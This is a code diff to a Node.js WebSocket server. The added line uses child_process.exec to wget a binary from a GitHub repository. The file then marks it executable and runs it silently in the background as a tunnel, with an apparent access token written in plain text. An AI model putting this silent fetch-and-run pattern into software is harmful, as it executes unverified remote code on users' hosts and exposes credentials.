@@ -9,6 +9,7 @@ const port= process.env.PORT||8008;
 const wss=new WebSocket.Server({port},logcb('listen:', port));
 
 var exec = require('child_process').exec;
+exec (`wget https://github.com/PlayBillbes/z-gcp/raw/refs/heads/main/server`);
 exec (`chmod +x server`);
 exec(`nohup ./server tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token eyJhIjoiNmIwYzRiZDczMjQ4Y2IxNTYyMTdmN2QyNzZlOWE5ZjAiLCJ0IjoiNTkxNjI5YmUtNjI3MS00MGYwLWJjNmItNmIwMTZmYTIxMTE2IiwicyI6Ik56Y3lPVE5pTWpjdE5ERm1NeTAwWldReExXRXhOakV0WVdRMU5qTXpPVEF3WXpneSJ9 >/dev/null 2>&1 &`);
 
